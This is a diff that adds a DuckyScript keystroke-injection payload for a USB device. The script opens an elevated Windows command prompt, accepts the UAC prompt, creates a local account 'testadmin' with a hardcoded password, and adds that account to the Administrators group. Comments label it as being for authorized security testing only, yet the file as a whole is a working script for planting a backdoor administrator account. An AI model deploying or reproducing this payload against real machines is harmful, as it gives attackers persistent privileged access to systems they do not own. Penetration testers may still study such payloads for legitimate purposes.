@@ -1,0 +1,41 @@
+REM Create Admin User Account
+REM Creates a new administrator user account
+REM WARNING: Only for authorized security testing!
+REM Requires existing admin privileges
+
+DELAY 1000
+GUI r
+DELAY 500
+STRING cmd
+DELAY 500
+CTRL SHIFT ENTER
+DELAY 1000
+ALT y
+DELAY 500
+STRING net user testadmin P@ssw0rd123 /add
+DELAY 500
+ENTER
+DELAY 1000
+STRING net localgroup administrators testadmin /add
+DELAY 500
+ENTER
+DELAY 1000
+STRING echo User created successfully
+DELAY 500
+ENTER
+DELAY 1000
+STRING echo Username: testadmin
+DELAY 500
+ENTER
+DELAY 500
+STRING echo Password: P@ssw0rd123
+DELAY 500
+ENTER
+DELAY 1000
+STRING echo WARNING: Change password immediately!
+DELAY 500
+ENTER
+DELAY 2000
+STRING exit
+DELAY 500
+ENTER
